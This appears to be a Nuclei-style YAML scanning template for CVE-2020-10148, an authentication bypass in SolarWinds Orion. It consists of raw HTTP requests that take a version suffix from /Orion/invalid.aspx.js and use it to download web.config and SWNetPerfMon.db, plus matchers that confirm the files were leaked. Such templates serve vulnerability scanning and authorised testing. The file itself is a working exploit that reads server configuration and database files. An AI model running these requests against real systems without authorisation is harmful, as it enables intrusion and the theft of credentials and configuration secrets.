id: cve-2020-10148
info:
  name: Local File Disclosure for SolarWinds Orion
  author: harryha
  severity: high
  description: >
    The SolarWinds Orion API is vulnerable to an authentication bypass that
    could allow a remote attacker to execute API commands. 
    This vulnerability could allow a remote attacker to bypass authentication
    and execute API commands which may result in a compromise of the SolarWinds
    instance.
    SolarWinds Orion Platform versions 2019.4 HF 5, 2020.2 with no hotfix installed, and 2020.2 HF 1 are affected
requests:
  - raw:
      - >
        GET /Orion/invalid.aspx.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
        Firefox/68.0
        Accept: */*
        Connection: close
      - >
        GET /web.config§version§ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
        Firefox/68.0
        Accept: */*
        Connection: close
      - >
        GET /SWNetPerfMon.db§version§ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
        Firefox/68.0
        Accept: */*
        Connection: close
    extractors:
      - type: regex
        name: version
        part: header
        internal: true
        group: 1
        regex:
          - /Orion/invalid.aspx.js(.*)
    matchers:
      - type: word
        words:
          - orionProxy
          - sw.web.compression
          - SolarWinds.Orion.Core.
        condition: or
        part: body
